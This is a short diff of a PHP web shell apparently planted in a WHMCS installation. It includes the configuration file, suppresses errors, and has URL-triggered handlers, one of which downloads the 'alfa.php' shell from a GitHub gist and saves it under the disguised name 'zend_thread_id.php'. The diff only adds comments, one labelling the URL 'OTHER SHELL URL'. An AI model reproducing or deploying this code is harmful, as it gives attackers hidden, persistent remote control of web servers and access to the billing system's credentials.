@@ -1,4 +1,4 @@
-<?php include('configuration.php'); error_reporting(0);
+<?php include('configuration.php'); error_reporting(0); //WHMCS C0nfiguration 
 $BaseURL = $_SERVER['HTTP_HOST'];
 $PhpSelf = $_SERVER['PHP_SELF'];
 $Filename = "/".basename($_SERVER['PHP_SELF']);
@@ -94,7 +94,7 @@ if(isset($_GET['upload']))
 
 if(isset($_GET['su']))
 {
- $file_url="https://gist.githubusercontent.com/B0RU70/4be357e6cb784a5ed4075f55e2645408/raw/a46fd52bbd91581b66d7ed1b10cc7cd5f17a50aa/alfa.php";
+ $file_url="https://gist.githubusercontent.com/B0RU70/4be357e6cb784a5ed4075f55e2645408/raw/a46fd52bbd91581b66d7ed1b10cc7cd5f17a50aa/alfa.php"; // OTHER SHELL URL
  $data = file_get_contents($file_url);
  $new = 'zend_thread_id.php';
  $upload =file_put_contents($new, $data);
